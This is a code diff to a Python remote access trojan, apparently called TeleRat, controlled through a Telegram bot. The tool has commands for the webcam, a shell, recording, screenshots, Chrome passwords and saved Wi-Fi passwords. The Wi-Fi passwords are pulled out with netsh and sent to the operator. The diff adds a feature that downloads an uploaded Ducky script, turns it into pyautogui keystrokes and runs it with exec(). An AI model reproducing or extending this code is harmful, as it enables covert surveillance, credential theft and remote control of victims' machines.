@@ -1,6 +1,6 @@
 import os
 try:
-    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder
+    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder,time
     from telebot import types
     from Crypto.Cipher import AES
     from datetime import timezone, datetime, timedelta
@@ -34,8 +34,10 @@ def record():
     except:
         pass
 
-'''
-def wifi_pass1():
+#WIFI PASSWORD
+
+
+def wifi_pass():
     wifipass = open('wifipass.txt','w')
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
@@ -51,10 +53,8 @@ def wifi_pass1():
                 wifipass.write("\n")
         except subprocess.CalledProcessError:
             pass
-'''
 
-#WIFI PASSWORD
-def wifi_pass():
+def wifi_pass1():
     wifipass = open('wifipass.txt','w')
     os.system('netsh wlan show profiles >> wifi_temp.txt')
     data = open('wifi_temp.txt','r').read().replace('''
@@ -140,6 +140,42 @@ def screenshoot_click():
     except:
         pass
 
+#                      DUCKY
+
+def ducktopython(file):
+    f = open(file,"r",encoding='utf-8')
+    ducktopy = ''
+    ducktopy = ducktopy+"import pyautogui\n"
+    ducktopy = ducktopy+"import time\n"
+    duckyScript = f.readlines()
+    duckyScript = [x.strip() for x in duckyScript]
+    defaultDelay = 0
+    if duckyScript[0][:7] == "DEFAULT":
+	    defaultDelay = int(duckyScript[0][:13]) / 1000
+    previousStatement = ""
+    duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN","LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END","ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE","TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t"," u", " v", " w", " x", " y", " z", " A", " B"," C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P"," Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]
+    pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down","left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end","esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space","tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t","u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h","i","j", "k", "l", "m", "n", "o", "p","q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
+    for line in duckyScript:
+	    if line[0:3] == "REM" :
+		    previousStatement = line.replace("REM","#")
+	    elif line[0:5] == "DELAY" :
+		    previousStatement = "time.sleep(" + str(float(line[6:]) / 1000) + ")"
+	    elif line[0:6] == "STRING" :
+		    previousStatement = "pyautogui.typewrite(\"" + line[7:] + "\", interval=0.02)"
+	    elif line[0:6] == "REPEAT" :
+		    for i in range(int(line[7:]) - 1):
+			    ducktopy = ducktopy+previousStatement+"\n"
+	    else:
+		    previousStatement = "pyautogui.hotkey("
+		    for j in range(len(pyautoguiCommands)):
+			    if line.find(duckyCommands[j]) != -1:
+				    previousStatement = previousStatement + "\'" +     pyautoguiCommands[j] + "\',"
+		    previousStatement = previousStatement[:-1] + ")"
+	    if defaultDelay != 0:
+		    previousStatement = "time.sleep(" + defaultDelay + ")"
+	    ducktopy = ducktopy+previousStatement+"\n"
+    exec(ducktopy)
+
 #-----------------------------------------------------------------------------------------------------------------#
 
 #                      START
@@ -150,20 +186,47 @@ try:
     markup = types.ReplyKeyboardMarkup(row_width=1)
     itembtn1 = types.KeyboardButton('Cam')
     itembtn2 = types.KeyboardButton('Shell')
-    itembtn3 = types.KeyboardButton('Record')
-    itembtn4 = types.KeyboardButton('wifipass')
-    itembtn5 = types.KeyboardButton('screenshot')
-    itembtn6 = types.KeyboardButton('chromepass')
-    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6)
+    itembtn3 = types.KeyboardButton('Ducky')
+    itembtn4 = types.KeyboardButton('Record')
+    itembtn5 = types.KeyboardButton('wifipass')
+    itembtn6 = types.KeyboardButton('screenshot')
+    itembtn7 = types.KeyboardButton('chromepass')
+    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6,itembtn7)
     bot.send_message(message.from_user.id,message.text, reply_markup=markup)
 except:
     pass
 
 #                      COMMANDS
 
+
+@bot.message_handler(content_types=['document'])
+def send_text(message):
+    try:
+        file_id = bot.get_file(message.document.file_id)
+        if '.txt' in str(file_id.file_path):
+            duck_script_run = bot.download_file(file_id.file_path)
+            with open("TeleRat_DUCKSCRIPT.txt", "w") as f:
+                f.write(duck_script_run.decode('utf-8').replace('\n',''))
+                f.close()
+            ducktopython("TeleRat_DUCKSCRIPT.txt")
+            os.remove("TeleRat_DUCKSCRIPT.txt")
+            bot.send_message(message.from_user.id, 'Script Executed')
+        else:
+            bot.send_message(message.from_user.id, 'Expecting a text file!!!')
+    except:
+        bot.send_message(message.from_user.id, 'Error!')
+
+
 try:
   @bot.message_handler(func=lambda message: True)
   def message_handel(message):
+
+    #Ducky
+    try:
+      if str(message.text).lower() == 'ducky':
+        bot.send_message(message.from_user.id, 'UPLOAD a .txt containing ducky script!!')
+    except:
+        bot.send_message(message.from_user.id, 'Error!')
 
     #CAMERA
     try:
@@ -218,14 +281,20 @@ try:
         bot.send_message(message.from_user.id, 'Error!')
 
     #WIFI PASSWORD
-    if str(message.text).lower() == 'wifipass':
-        bot.send_message(message.from_user.id, 'Capturing Wifi Passwords, Please wait...')
-        wifi_pass()
-        wifi_pass_open = open('wifipass.txt', 'rb')
-        bot.send_document(message.from_user.id, wifi_pass_open)
-        wifi_pass_open.close()
-        if os.path.exists("wifipass.txt"):
-            os.remove("wifipass.txt")
+    try:
+        if str(message.text).lower() == 'wifipass':
+            bot.send_message(message.from_user.id, 'Capturing Wifi Passwords, Please wait...')
+            try:
+                wifi_pass()
+            except:
+                wifi_pass1()
+            wifi_pass_open = open('wifipass.txt', 'rb')
+            bot.send_document(message.from_user.id, wifi_pass_open)
+            wifi_pass_open.close()
+            if os.path.exists("wifipass.txt"):
+                os.remove("wifipass.txt")
+    except:
+        bot.send_message(message.from_user.id, 'Error!')
 
     #Shell
     try:
